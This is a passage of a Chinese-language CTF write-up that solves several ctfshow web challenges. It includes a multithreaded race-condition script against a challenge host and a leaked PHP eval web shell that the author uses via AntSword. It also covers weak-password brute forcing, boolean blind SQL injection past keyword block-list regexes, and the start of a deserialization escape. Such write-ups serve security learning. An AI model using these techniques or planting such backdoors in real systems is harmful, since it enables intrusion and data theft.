class="comment">//判断两文件的MD5值是否相等</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//如果两个文件的sha512值不相等</span></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义了一个名为 <code>receiveStreamFile</code> 的函数，主要功能是接收流数据并将其写入指定的文件中。</li>
<li><code>$GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;]</code> 是 PHP 中的一个全局变量，用于获取 HTTP POST 请求中的原始数据。</li>
<li><code>date(&quot;i&quot;)</code> 中的参数 “i” 代表获取时间的分钟部分。</li>
</ul>
<p>这里的话有条件就是需要让两个文件的md5值相等但是sha512值不相等</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310200920613.png" alt="image-20250310200920613"></p>
<p>在源码中看到一行代码</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oReq.open(<span class="string">&quot;<span class="keyword">POST</span>&quot;</span>, <span class="string">&quot;check.php?token=&quot;</span>+token+<span class="string">&quot;&amp;php://input&quot;</span>, true);</span><br></pre></td></tr></table></figure>

<p> 对当前日期做了一个MD5的编码,可以发现是需要用php:&#x2F;&#x2F;input获取文件流，然后返回一个文件</p>
<p>需要自己传上去的文件与已存在的key.dat MD5要一致，sha512不一致，但是首先的就是我们需要获取到这个key.dat，后来发现直接访问就下载下来了</p>
<p>但是这里是需要条件竞争的，因为token值是会变化的</p>
<p>直接贴脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入 requests 库，用于发送 HTTP 请求</span></span><br><span class="line"><span class="keyword">import</span> time  <span class="comment"># 导入 time 模块，用于获取本地时间</span></span><br><span class="line"><span class="keyword">import</span> hashlib  <span class="comment"># 导入 hashlib 模块，用于进行哈希加密</span></span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 导入 threading 模块，用于多线程操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个代表当前分钟数的字符串，并存储在变量 i 中</span></span><br><span class="line">i=<span class="built_in">str</span>(time.localtime().tm_min)</span><br><span class="line"><span class="comment"># 使用 MD5 算法对分钟数进行哈希加密，生成 token，并存储在变量 m 中</span></span><br><span class="line">m=hashlib.md5(i.encode()).hexdigest()</span><br><span class="line"><span class="comment"># 构造请求的 URL，其中 token 的数值由生成的 m 变量决定</span></span><br><span class="line">url=<span class="string">&quot;http://335e5b97-20c5-455c-a7ad-808a2cdba8d8.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;</span>.<span class="built_in">format</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个将数据以 POST 请求发送的函数 POST</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(url,data=data)  <span class="comment"># 发送 POST 请求到指定的 URL，并传递 data 数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:  <span class="comment"># 如果响应文本中包含 &quot;ctfshow&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(r.text)  <span class="comment"># 打印响应文本</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;somthing went wrong!&quot;</span>)  <span class="comment"># 捕获异常，并打印错误信息</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取名为 &#x27;key.dat&#x27; 的文件内容，并存储在 data1 变量中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> t:</span><br><span class="line">    data1=t.read()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启 50 个线程，每个线程发送一个 POST 请求，传递 data1 数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST,args=(data1,)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启 50 个线程，每个线程发送一个 POST 请求，传递 &#x27;emmmmm&#x27; 字符串数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    data2=<span class="string">&#x27;emmmmm&#x27;</span></span><br><span class="line">    threading.Thread(target=POST,args=(data2,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把地址换一下就可以跑出来了，这里需要把key.dat文件放在python目录中</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310202633671-1741609595157-43.png" alt="image-20250310202633671"></p>
<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><h3 id="git文件泄露-绕过disable-function"><a href="#git文件泄露-绕过disable-function" class="headerlink" title="#.git文件泄露+绕过disable_function"></a>#.git文件泄露+绕过disable_function</h3><p>开出来就是php配置信息</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310203218395-1741609939898-46.png" alt="image-20250310203218395"></p>
<p>先看看这里有啥吧，顺便扫一下目录，发现有.git文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310204336031.png" alt="image-20250310204336031"></p>
<p>用GitHack去获取.git文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310204707338.png" alt="image-20250310204707338"></p>
<p>有两份文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//backdoor.php</span></span><br><span class="line">&lt;!-- <span class="number">36</span>D姑娘留的后门，闲人免进 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Letmein&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有后门文件，路径就是当前目录下的&#x2F;backdoor.php，访问后用蚁剑链接然后绕过disable_function</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310210111779.png" alt="image-20250310210111779"></p>
<p>一开始以为flag是在根目录的，然后去那里看了半天，结果发现是假的flag</p>
<h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="#弱口令爆破"></a>#弱口令爆破</h3><p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310210855502.png" alt="image-20250310210855502"></p>
<p>扫了一下目录，发现了一个main文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310212922119.png" alt="image-20250310212922119"></p>
<p>但是访问了啥都没有，继续回到登录界面看看，尝试弱口令爆破</p>
<p>试一下admin&#x2F;adminxxxx的弱口令尝试</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213510712.png" alt="image-20250310213510712"></p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213614397.png" alt="image-20250310213614397"></p>
<p>直接爆出来了</p>
<p>admin&#x2F;admin888</p>
<p>在返回包看到有flag加密字符</p>
<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250310213802382.png" alt="image-20250310213802382"></p>
<p>加密出来就是flag了</p>
<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="#布尔盲注"></a>#布尔盲注</h3><p>flag在指定用户的密码中。</p>
<p>一个登录界面，注册后登录</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213949344.png" alt="image-20250310213949344"></p>
<p>应该是需要找到这个flag用户的密码</p>
<p>但是在登录的时候抓包发现密码都会变成一段长字符</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310214258441.png" alt="image-20250310214258441"></p>
<p>常规扫目录看到有<a target="_blank" rel="noopener" href="http://www.zip文件,下载下来/">www.zip文件，下载下来</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">		<span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select pwd from user where uname = &#x27;<span class="subst">$username</span>&#x27; limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$res</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>]===<span class="variable">$password</span>)&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/user_main.php?order=id&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> p=$.<span class="title function_ invoke__">md5</span>($(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">val</span>());</span><br><span class="line">				$(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">val</span>(p);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;\]|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$email</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$nickname</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$email</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nickname</span>))&#123;</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user (uname, pwd, email,nname) VALUES (&#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;, &#x27;<span class="subst">$email</span>&#x27;,&#x27;<span class="subst">$nickname</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$res</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">			&#125; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话上面的长字符就可以理解了，传入的值进行了md5加密处理</p>
<p>不过大部分字符都被过滤了，正常的union注入应该不太好注，尝试布尔盲注</p>
<p>得知密码列为pwd，那么就可以通过已知注册用户密码和flag来进行比较，通过位置来确定每一个字符，如果我们注册的密码字符大于flag用户的密码那么就会返回这个字符，通过判断去进行注入</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/02aa69bd8a6c3fd38aff77dbe053af5.png" alt="02aa69bd8a6c3fd38aff77dbe053af5"></p>
<p>也是贴的别的师傅的脚本</p>
<h2 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h2><h3 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="#反序列化字符串逃逸"></a>#反序列化字符串逃逸</h3><p>这道题的逃逸手法没怎么看懂，是看着师傅的wp去做的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/15408090.html">[CTFSHOW-日刷-game-gyctf web2&#x2F;pop链-反序列字符逃逸]</a></p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311145931091.png" alt="image-20250311145931091"></p>
<p>一个登录界面，但是页面看不到回显，抓包之后才能看到</p>
<p>传入1&#x2F;1和admin&#x2F;1发现存在用户名枚举的漏洞</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150109185.png" alt="image-20250311150109185"></p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150139715.png" alt="image-20250311150139715"></p>
<p>常规扫目录看看有没有源码</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150554381.png" alt="image-20250311150554381"></p>
<p>把<a target="_blank" rel="noopener" href="http://www.zip文件下载下来,我这里把一些没用的东西去掉了/">www.zip文件下载下来，我这里把一些没用的东西去掉了</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在login.php文件里调用了user的login方法，跟进一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$mysqli</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;id)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable language_">$this</span>-&gt;id;  </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了dbCtrl类中的login方法，实际上就是一个数据库查询方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mysqli=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">    